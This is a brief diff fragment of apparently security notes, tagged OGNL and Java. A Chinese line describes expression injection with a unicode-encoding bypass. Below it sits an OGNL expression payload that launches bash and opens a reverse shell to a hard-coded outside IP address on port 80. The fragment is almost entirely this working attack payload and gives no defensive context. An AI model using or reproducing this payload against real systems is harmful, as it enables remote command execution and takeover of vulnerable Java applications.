@@ -5,7 +5,7 @@
 
 
 ### pain
-#ongi #java 
+#ongl #java 0
 表达式注入,使用unicode编码绕过
 ```shell
 (new java.lang.ProcessBuilder(new java.lang.String[]{'bash','-c','bash -i >& /dev/tcp/54.255.166.12/80 0>&1'})).start()
